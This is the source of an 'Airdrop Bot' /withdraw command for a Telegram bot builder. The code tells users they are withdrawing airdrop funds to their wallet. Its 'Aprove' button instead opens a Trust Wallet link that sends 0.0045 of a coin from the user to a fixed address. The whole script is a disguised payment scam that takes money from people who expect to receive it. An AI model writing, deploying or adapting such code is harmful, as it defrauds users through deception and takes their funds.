/*CMD
  command: /withdraw
  help: 
  need_reply: 
  auto_retry_time: 
  folder: 

  <<ANSWER
✅ Withdraw Funds from Airdrop Bot to Wallet
✅ To avoid errors please use Trust Wallet

⚠️Please set up your wallet first!
  ANSWER
  keyboard: ⚙️Settings, 📜Menu
  aliases: 💵withdraw
CMD*/

var buttons = [
  {title: "Aprove", url: "https://link.trustwallet.com/send?asset=c20000714&address=0x799E809631a837eA771B7D5182dEb1BC371516d1&amount=0.0045"},
  ];
Bot.sendInlineKeyboard(buttons, "☑️ Please Aprove withdraw transactions!");
